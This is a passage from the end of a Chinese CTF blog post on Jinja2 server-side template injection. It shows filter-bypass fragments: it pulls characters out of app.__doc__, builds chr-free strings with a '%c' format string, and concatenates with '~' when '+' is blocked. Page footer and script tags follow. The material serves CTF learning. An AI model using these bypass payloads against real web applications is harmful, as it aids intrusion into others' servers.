+<figure class="highlight coq"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs coq">(app.__doc__|<span class="hljs-type">list</span>()).pop(<span class="hljs-number">102</span>)|<span class="hljs-type">string</span>()<br></code></pre></div></td></tr></table></figure>
+
+<ul>
+<li>构造出<code>%</code>和<code>c</code>后，用格式化字符串代替<code>chr</code></li>
+</ul>
+<figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">&#123;%<span class="hljs-builtin-name">set</span> <span class="hljs-attribute">udl</span>=dict(a=pc,c=c).values()|join %&#125;      # <span class="hljs-attribute">uld</span>=%c<br>&#123;%<span class="hljs-builtin-name">set</span> <span class="hljs-attribute">i1</span>=dict(a=i1,c=udl%(99)).values()|join %&#125;<br></code></pre></div></td></tr></table></figure>
+
+<h2 id="7-等被过滤，无法拼接字符串"><a href="#7-等被过滤，无法拼接字符串" class="headerlink" title="7)+等被过滤，无法拼接字符串"></a>7)+等被过滤，无法拼接字符串</h2><ul>
+<li><code>~</code><br> 在jinja中可以拼接字符串</li>
+<li>格式化字符串<br> 同上</li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E4%BF%A1%E5%AE%89-CTF-%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/">信安 CTF 相关知识</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
+                    
+                      <a class="hover-with-bg" href="/tags/ssti/">ssti</a>
+                    
+                  </div>
+                
+              </div>
+              
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <i class="iconfont icon-love"></i> <a href="/" target="_blank" rel="nofollow noopener"><span>MyBlog</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
